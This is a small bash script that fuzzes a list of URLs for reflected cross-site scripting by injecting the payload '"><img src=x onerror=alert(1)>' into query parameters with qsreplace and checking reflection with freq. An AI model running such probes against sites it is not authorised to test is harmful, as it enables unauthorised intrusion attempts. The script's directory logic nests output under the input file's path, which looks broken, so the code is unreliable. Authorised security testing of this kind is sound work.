#!/bin/bash

# Function to perform XSS fuzzing for given URLs
xss_fuzzing() {
    local input_file=$1
    local date=$(date +'%Y-%m-%d')
    local base_dir="${input_file}/$([ "$IGNORE_SPLIT" = "false" ] && echo "${date}/")"
    local exploit_dir="${base_dir}/exploit"
    
    mkdir -p "${exploit_dir}"

    # Check if input file exists
    if [[ ! -f "${input_file}" ]]; then
        echo "Error: ${input_file} not found!"
        exit 1
    fi

    # Check if qsreplace is installed
    if ! command -v qsreplace &> /dev/null; then
        echo "Error: qsreplace is not installed. Please install it first."
        exit 1
    fi

    # Create xss_fuzz.txt by replacing the endpoints with the XSS payload
    echo "Generating XSS payloads for ${input_file}..."
    cat "${input_file}" | qsreplace '"><img src=x onerror=alert(1)>' | tee -a "${exploit_dir}/xss_fuzz.txt"
    echo "------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------"

    # Check if freq is installed
    if ! command -v freq &> /dev/null; then
        echo "Error: freq is not installed. Please install it first."
        exit 1
    fi

    # Analyze the frequency of endpoints in xss_fuzz.txt and save to possible_xss.txt
    # echo "Analyzing frequency of endpoints in ${exploit_dir}/xss_fuzz.txt..."
    cat "${exploit_dir}/xss_fuzz.txt" | freq | tee -a "${exploit_dir}/possible_xss.txt"
    echo "------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------"

    echo "Script execution completed. Check ${exploit_dir}/possible_xss.txt for possible XSS vulnerabilities."
}

# Check if input file is provided
if [ -z "$1" ]; then
    echo "Usage: $0 <input_file>"
    exit 1
fi

# Run the XSS fuzzing function with the provided input file
xss_fuzzing "$1"
